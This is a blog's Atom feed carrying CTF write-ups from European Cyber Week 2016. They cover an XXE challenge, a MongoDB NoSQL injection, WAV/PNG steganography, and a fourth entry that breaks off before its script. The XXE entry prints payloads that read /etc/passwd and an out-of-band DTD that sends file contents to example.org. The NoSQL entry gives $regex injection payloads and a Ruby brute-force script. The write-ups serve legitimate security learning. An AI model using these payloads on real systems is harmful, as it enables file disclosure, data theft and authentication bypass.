<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>RawSec</title>
  <subtitle>Security is everywhere</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://rawsec.ml/"/>
  <updated>2016-11-07T21:45:06.257Z</updated>
  <id>http://rawsec.ml/</id>
  
  <author>
    <name>Alexandre ZANNI</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ECW - 150 - Carnet d&#39;adresses - Web</title>
    <link href="http://rawsec.ml/en/ECW-2016-carnet-dadresse/"/>
    <id>http://rawsec.ml/en/ECW-2016-carnet-dadresse/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-07T21:45:06.257Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This one is a XML External Entity ([XXE][xxe]) attack and Out-Of-Band (OOB) channel exfiltration is not working.</p>
<p><a href="https://www.gracefulsecurity.com/xml-external-entity-injection-xxe-vulnerabilities/" target="_blank" rel="external">xxe</a></p>
<p>We are given the following form:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jean Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
<p>And the following answer confirming the well formated XML request:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./MNfloDfo.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;Jean Dupont&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./MNfloDfo.xml</div></pre></td></tr></table></figure>
<p>We should be able to leak data into the answer banner.</p>
<p>Confirmation that entities are interpreted:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe "XXE vuln"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;t<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./J2tuDR8g.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;XXE vulnt&apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./J2tuDR8g.xml</div></pre></td></tr></table></figure>
<p>Nice that’s working so try to leak some files:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "http://example.org/test"&gt;]&gt;</div></pre></td></tr></table></figure>
<p>=&gt; doesn’t work</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></div></pre></td></tr></table></figure>
<p>=&gt; doesn’t work</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" &gt;]&gt;</span></div></pre></td></tr></table></figure>
<p>=&gt; doesn’t work</p>
<p>[…] and we tried a lot of logical filename on various operating systems.</p>
<p>But how did we find out the right? The challenge required no logic but only guessing …</p>
<p>I firstly thought the banner was useless because no file was leaked in it. So I thought it was some blind xxe:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE contacts [ &lt;!ENTITY % pe SYSTEM &quot;http://example.org/xxe_file&quot;&gt; %pe; %param1; ]&gt;</div><div class="line">&lt;contacts&gt;</div><div class="line">  &lt;contact&gt;</div><div class="line">    &lt;name&gt;&amp;external;&lt;/name&gt;</div><div class="line">    [...]</div></pre></td></tr></table></figure>
<p><code>xxe_file</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!ENTITY % payload SYSTEM &quot;file:///etc/passwd&quot;&gt;</div><div class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &apos;http://example.org/log_xxe?data=%payload;&apos;&gt;&quot;&gt;</div></pre></td></tr></table></figure>
<p>And a tried a lot…</p>
<p>But no, in fact no files were leakable exept <code>flag.txt</code>. It was impossible to find out it was just guessing because rules and description didn’t mention any convention.</p>
<p>I passed hours on days to craft sophishticated blind xxe requests and it was only a very easy xxe but filename had to be guessed, it was easy to think that xxe was not working as others files was not leaked.</p>
<p>Realistic challenge should have be better.</p>
<p>But indeed some people find it realy easily as <code>flag.txt</code> can be common in CTF.</p>
<p>I insist on the fact that’s is only CTF guessing, in real life this never occurs.</p>
<p>Here was the easy XXE :</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE contacts</span></div><div class="line">[&lt;!ENTITY xxe SYSTEM "flag.txt"&gt;]&gt;</div><div class="line"><span class="tag">&lt;<span class="name">contacts</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>00 11 22 33 44<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">adress</span>&gt;</span>42 rue CTF<span class="tag">&lt;/<span class="name">adress</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">zipcode</span>&gt;</span>42000<span class="tag">&lt;/<span class="name">zipcode</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">city</span>&gt;</span>ECW<span class="tag">&lt;/<span class="name">city</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">contact</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Jack Dupont<span class="tag">&lt;/<span class="name">name</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">phone</span>&gt;</span>01 02 03 04 05<span class="tag">&lt;/<span class="name">phone</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">contact</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">contacts</span>&gt;</span></div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Création du fichier ./WDpFYEM5.xml</div><div class="line"></div><div class="line">Import du fichier :</div><div class="line"></div><div class="line">    Importation de &apos;ECW&#123;8dd72b9b3095380de595d734492d69c9&#125; &apos; dans le carnet d&apos;adresses</div><div class="line">    Importation de &apos;Jack Dupont&apos; dans le carnet d&apos;adresses</div><div class="line"></div><div class="line">Suppression du fichier ./WDpFYEM5.xml</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ECW - 100 - Pas seulement BSON - Web</title>
    <link href="http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/"/>
    <id>http://rawsec.ml/en/ECW-2016-pas-seulement-BSON/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-07T21:44:57.227Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>This is a <a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection" target="_blank" rel="external">NoSQL injection</a> on the famous <a href="https://www.mongodb.com/" target="_blank" rel="external">MongoDB</a> with certain <a href="http://www.php.net/manual/en/mongo.security.php" target="_blank" rel="external">PHP</a> at backend.</p>
<p>We used the <a href="queryOperator">query operators</a> to perform the NoSQLi.</p>
<p>We tested the following payload in our script with the <a href="https://docs.mongodb.com/manual/reference/operator/query/ne/#op._S_ne" target="_blank" rel="external">ne</a> query operator to confirm presence of the vulnerability:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">password[$ne]=nosql&amp;nonce=myNonce</div></pre></td></tr></table></figure>
<p>Then we retrieved the password letter by letter with the <a href="https://docs.mongodb.com/manual/reference/operator/query/regex/#op._S_regex" target="_blank" rel="external">regex</a> query operator of NoSQL.<br>At the beginning the script uses the following paylods:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;.&#123;32&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;a.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;b.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;c.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>Each bad request results in an authentification failure and when the right char is found with a succesful authentification, the script with try to find the next chars with something like:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">password[$regex]=ECW&#123;2.&#123;31&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2a.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2b.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">password[$regex]=ECW&#123;2c.&#123;30&#125;&#125;&amp;nonce=myNonce</div><div class="line">[...]</div></pre></td></tr></table></figure>
<p>So here is our script that we adapted from the first web challenge <em>Authentification</em>.</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'curb'</span> <span class="comment"># for get/post requests</span></div><div class="line"></div><div class="line">hostname = <span class="string">'https://challenge-ecw.fr/chals/web200'</span></div><div class="line">nonce = <span class="string">'myNonce'</span></div><div class="line"></div><div class="line">c = Curl::Easy.new(hostname) <span class="keyword">do</span> <span class="params">|curl|</span></div><div class="line">  curl.headers[<span class="string">'Cookie'</span>] = <span class="string">'session=mySessionCookie'</span></div><div class="line">  curl.headers[<span class="string">'Referer'</span>] = hostname</div><div class="line">  curl.headers[<span class="string">'Host'</span>] = <span class="string">'challenge-ecw.fr'</span></div><div class="line">  curl.headers[<span class="string">'Connection'</span>] = <span class="string">'keep-alive'</span></div><div class="line">  curl.headers[<span class="string">'Upgrade-Insecure-Requests'</span>] = <span class="string">'1'</span></div><div class="line">  <span class="comment">#curl.verbose = true</span></div><div class="line"><span class="keyword">end</span> <span class="comment"># Curl</span></div><div class="line">c.perform <span class="comment"># send the request</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> c.body_str.match(<span class="regexp">/Un nouveau m/</span>)</div><div class="line">  puts <span class="string">'• Connexion to ECW works'</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">length = <span class="number">32</span> <span class="comment"># md5(hash)</span></div><div class="line"></div><div class="line"><span class="comment"># Find each char of the password one by one</span></div><div class="line">answer = <span class="string">""</span></div><div class="line">ECW_flag_alphabet_array = (<span class="string">'a'</span>..<span class="string">'f'</span>).to_a + (<span class="number">0</span>.to_s..<span class="number">9</span>.to_s).to_a <span class="comment"># md5(hash)</span></div><div class="line">(<span class="number">1</span>..length).each <span class="keyword">do</span> <span class="params">|offset|</span></div><div class="line">  ECW_flag_alphabet_array.each <span class="keyword">do</span> <span class="params">|char|</span></div><div class="line">    c.http_post(Curl::PostField.content(<span class="string">'password[$regex]'</span>, <span class="string">"ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>.&#123;<span class="subst">#&#123;length - offset&#125;</span>&#125;&#125;"</span>),</div><div class="line">                Curl::PostField.content(<span class="string">'nonce'</span>, nonce))</div><div class="line">    c.perform</div><div class="line">    <span class="keyword">if</span> c.body_str.match(<span class="regexp">/Authentification valide\. Le mot de passe est le flag\./</span>)</div><div class="line">      answer.concat(char)</div><div class="line">      puts <span class="string">"Password: ECW&#123;<span class="subst">#&#123;answer&#125;</span>&#125;"</span></div><div class="line">      <span class="keyword">break</span></div><div class="line">    <span class="keyword">else</span></div><div class="line">      puts <span class="string">"Tried: ECW&#123;<span class="subst">#&#123;answer&#125;</span><span class="subst">#&#123;char&#125;</span>&#125;"</span></div><div class="line">    <span class="keyword">end</span></div><div class="line">  <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="web" scheme="http://rawsec.ml/tags/web/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ECW - 50 - Mario - Misc</title>
    <link href="http://rawsec.ml/en/ECW-2016-mario/"/>
    <id>http://rawsec.ml/en/ECW-2016-mario/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-07T21:45:10.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Donwload the mario music on the web page and let’s analyse it with binwalk:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]</div><div class="line">$ binwalk hurry-overworld.wav                                                                                                                                                                                                               </div><div class="line"></div><div class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</div><div class="line">--------------------------------------------------------------------------------</div><div class="line">1288          0x508           YAFFS filesystem</div><div class="line">16416         0x4020          YAFFS filesystem</div><div class="line">137724        0x219FC         MySQL ISAM compressed data file Version 1</div><div class="line">432662        0x69A16         YAFFS filesystem</div><div class="line">530464        0x81820         YAFFS filesystem</div><div class="line">1631770       0x18E61A        YAFFS filesystem</div><div class="line">1749494       0x1AB1F6        MySQL MISAM index file Version 5</div><div class="line">2335928       0x23A4B8        MySQL ISAM index file Version 1</div><div class="line">4111020       0x3EBAAC        MySQL MISAM compressed data file Version 2</div><div class="line">9465612       0x906F0C        YAFFS filesystem</div><div class="line">11467052      0xAEF92C        PNG image, 883 x 648, 8-bit/color RGBA, non-interlaced</div><div class="line">11467151      0xAEF98F        Zlib compressed data, best compression</div></pre></td></tr></table></figure>
<p>Did you see the embed PNG? Let’s extract it with <em>foremost</em>.</p>
<p>Now we can check the image file.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]</div><div class="line">$ file mario-hidden.png</div><div class="line">mario-hidden.png: PNG image data, 883 x 648, 8-bit/color RGBA, non-interlaced</div></pre></td></tr></table></figure>
<p>Just by displaying it we have seen: <code>ECW{3a2ef8a1</code>.</p>
<p><img src="http://i.imgur.com/Z8XcV5i.png" alt="flag part 1"></p>
<p>Now let’s see where is the second part of the flag!</p>
<p>This challenge seems to be a steganography one. Let’s check a classic: LSB.</p>
<p>Nothing in the picture so let’s check the <code>.wav</code>.</p>
<p>I found a <a href="https://ethackal.github.io/2015/10/05/derbycon-ctf-wav-steganography/" target="_blank" rel="external">writeup</a> talking about LSB in a WAV file.</p>
<p>Perfect it’s using my favorite scripting language (Ruby) and <a href="https://github.com/shokai/ruby-wav-file" target="_blank" rel="external">this ruby gem</a>.</p>
<p>We used the same script as in the writup:</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env ruby</span></div><div class="line"></div><div class="line"><span class="keyword">require</span> <span class="string">'wav-file'</span></div><div class="line"></div><div class="line">wav = open(<span class="string">"hurry-overworld.wav"</span>)</div><div class="line">format = WavFile::readFormat(wav)</div><div class="line"><span class="comment"># puts format</span></div><div class="line">chunk = WavFile::readDataChunk(wav)</div><div class="line"></div><div class="line">wav.close</div><div class="line"></div><div class="line">wavs = chunk.data.unpack(<span class="string">'s*'</span>)</div><div class="line">lsb = wavs.map&#123;<span class="params">|sample|</span> sample[<span class="number">0</span>]&#125;.join</div><div class="line">flag = lsb[(lsb.index(<span class="string">'1'</span>))..-<span class="number">1</span>]</div><div class="line">puts [flag].pack(<span class="string">'b*'</span>)</div></pre></td></tr></table></figure>
<p>Here is what we retrived we the script:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]</div><div class="line">$ ./mario-wav-lsb.rb &gt; out</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––––––––––––––––––––––[~/CTF/ECW/2016]</div><div class="line">$ file out</div><div class="line">out: PNG image data, 900 x 675, 8-bit/color RGBA, non-interlaced</div></pre></td></tr></table></figure>
<p>Display the new image and get the second part of the flag: <code>ccf280865a1ef96bdb0c901c}</code>.</p>
<p><img src="http://i.imgur.com/5733RGM.png" alt="flag part 2"></p>
<p>Flag: <code>ECW{3a2ef8a1ccf280865a1ef96bdb0c901c}</code>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Informations&quot;&gt;&lt;a href=&quot;#Informations&quot; class=&quot;headerlink&quot; title=&quot;Informations&quot;&gt;&lt;/a&gt;Informations&lt;/h2&gt;&lt;h3 id=&quot;Version&quot;&gt;&lt;a href=&quot;#Versio
    
    </summary>
    
      <category term="security" scheme="http://rawsec.ml/categories/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/categories/security/writeups/"/>
    
    
      <category term="security" scheme="http://rawsec.ml/tags/security/"/>
    
      <category term="writeups" scheme="http://rawsec.ml/tags/writeups/"/>
    
      <category term="ctf" scheme="http://rawsec.ml/tags/ctf/"/>
    
      <category term="misc" scheme="http://rawsec.ml/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>ECW - 150 - Dilemme - Misc</title>
    <link href="http://rawsec.ml/en/ECW-2016-dilemme/"/>
    <id>http://rawsec.ml/en/ECW-2016-dilemme/</id>
    <published>2016-11-05T23:00:00.000Z</published>
    <updated>2016-11-07T21:44:52.883Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Informations"><a href="#Informations" class="headerlink" title="Informations"></a>Informations</h2><h3 id="Version"><a href="#Version" class="headerlink" title="Version"></a>Version</h3><table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><ul>
<li><strong>Name</strong> : European Cyber Week CTF Quals 2016</li>
<li><strong>Website</strong> : <a href="https://challenge-ecw.fr/" target="_blank" rel="external">challenge-ecw.fr</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy - Student</li>
</ul>
<h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p>N.A.</p>
<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>For this challenge we needed to solve a captcha and a QR code as faster as possible.</p>
<p>For this I wrote a ruby script:</p>
